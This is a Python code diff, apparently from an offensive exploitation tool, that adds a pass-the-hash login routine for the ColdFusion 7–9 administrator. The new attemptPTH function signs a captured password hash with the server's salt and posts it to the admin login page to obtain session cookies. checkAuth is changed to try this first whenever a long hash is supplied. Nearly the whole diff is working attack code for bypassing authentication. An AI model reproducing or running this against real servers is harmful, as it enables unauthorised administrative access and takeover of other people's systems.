@@ -81,6 +81,40 @@ def attemptRDS(ip, port):
             return (dict_from_cookiejar(response.cookies), None)
 
 
+def attemptPTH(url, usr_auth):
+    """ In vulnerable instances of CF7-9, you can use --cf-hash to obtain
+    the remote server's hash and pass it.            
+    """            
+    
+    utility.Msg("Attempting to pass the hash..", LOG.DEBUG)
+    
+    usr = None
+    pwhsh = None
+    if ':' in usr_auth:
+        (usr, pwhsh) = usr_auth.split(':')
+    else:
+        usr = 'admin'
+        pwhsh = usr_auth
+
+    salt = _salt(url) 
+    hsh = hmac.new(salt, pwhsh, sha1).hexdigest().upper()
+    data = {"cfadminPassword" : hsh,
+            "requestedURL" : "/CFIDE/administrator/enter.cfm?",
+            "cfadminUserId" : usr, 
+            "salt" : salt,
+            "submit" : "Login"
+           }
+
+    try:
+        res = utility.requests_post(url, data=data)
+        if res.status_code is 200 and len(res.history) > 0:
+            utility.Msg("Sucessfully passed the hash", LOG.DEBUG)
+            return (dict_from_cookiejar(res.history[0].cookies), None)
+        
+    except Exception, e:
+        utility.Msg("Error authenticating: %s" % e, LOG.ERROR)
+
+
 def checkAuth(ip, port, title, version):
     """
     """
@@ -89,6 +123,12 @@ def checkAuth(ip, port, title, version):
 
     # check with given auth
     if state.usr_auth:
+        if version in ['7.0','8.0','9.0'] and len(state.usr_auth) >= 40:
+            # try pth
+            cook = attemptPTH(url, state.usr_auth)
+            if cook:
+                return cook
+
         (usr, pswd) = state.usr_auth.split(':')
         return _auth(usr, pswd, url, version)
 
